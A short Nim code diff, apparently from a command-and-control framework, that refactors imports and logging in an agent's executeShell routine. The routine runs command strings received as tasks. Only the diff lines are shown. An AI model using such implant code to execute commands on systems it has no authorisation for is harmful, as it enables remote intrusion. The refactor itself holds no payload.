@@ -29,9 +29,9 @@ when not defined(agent):
 
 when defined(agent):
 
-    import osproc, strutils, strformat
+    import osproc, strformat
+    import ../agent/utils/io
     import ../agent/protocol/result
-    import ../common/utils
     
     proc executeShell(ctx: AgentCtx, task: Task): TaskResult = 
         try: 
@@ -50,7 +50,7 @@ when defined(agent):
                 for arg in task.args[1..^1]: 
                     arguments &= Bytes.toString(arg.data) & " "
 
-            echo fmt"   [>] Executing command: {command} {arguments}"
+            print fmt"   [>] Executing command: {command} {arguments}"
 
             let (output, status) = execCmdEx(fmt("{command} {arguments}")) 
 
